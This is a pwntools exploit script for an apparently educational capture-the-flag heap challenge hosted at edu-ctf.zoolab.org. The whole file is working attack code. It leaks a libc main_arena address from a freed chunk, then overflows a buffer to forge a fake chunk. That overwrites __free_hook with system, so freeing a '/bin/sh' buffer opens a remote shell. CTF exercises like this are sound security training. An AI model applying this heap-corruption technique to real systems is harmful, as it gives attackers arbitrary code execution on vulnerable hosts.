from pwn import *

context.arch='amd64';context.terminal=['tmux','splitw','-h']
#context.log_level = "Debug"
#r = process("./chal")
r = remote("edu-ctf.zoolab.org","10008")


def add( index , username , password ):
    r.sendlineafter( '>' , b'1' )
    r.sendlineafter( "index\n> ", str(index).encode() )
    r.sendlineafter( "username\n> ",str(username).encode())
    r.sendlineafter( "password\n> ", str(password).encode()) 
def edit( index , size , idc_p_data_size ):
    r.sendlineafter( '>' , b'2' )
    r.sendlineafter( "index\n> ", str(index).encode())
    r.sendlineafter( 'size\n> ' , str(size).encode())
    r.send( str(idc_p_data_size).encode()) #users[idx]->data, size

def delete( index ):
    r.sendlineafter( '>' , b'3' )
    r.sendlineafter( "index\n> ", str(index).encode() )
                                                     

def show():
    r.sendlineafter( '>' , b'4' )

add(1,"A"*8,"A"*8)
edit(1,0x418,"A")
add(2,"B"*8,"B"*8)
edit(2,0x18,"B")
add(3,"C"*8,"C"*8)
delete(1)
show()



r.recvuntil("data: ")
main_arena = u64(r.recv(6).ljust(8,b"\x00"))
free_hook = main_arena + 0x2268 
system = main_arena - 0x19a950
info(f"main_arena : {hex(main_arena)}")
print("main_arena :", main_arena)
print("free_hook",free_hook)
print("system",system)


data = b'/bin/sh\x00'.ljust(0x10, b"B")
fake_chunk =flat(
    0, 0x31,
    b"AAAAAAAA", b"AAAAAAAA",
    b"AAAAAAAA", b"AAAAAAAA",
    free_hook,
    )

#edit(2, 0x48, data )
r.sendlineafter('>', b'2')
r.sendlineafter( "index\n> ", b'2')
r.sendlineafter( "size\n> ", b'1048')
r.send( data + fake_chunk )

#edit(2, 0x8, p64(system))
r.sendlineafter('>', b'2')
r.sendlineafter( "index\n> ", b'3')
r.sendlineafter( "size\n> ", b'8')
r.send( p64(system) )

delete(2)

#gdb.attach(r)
r.interactive()
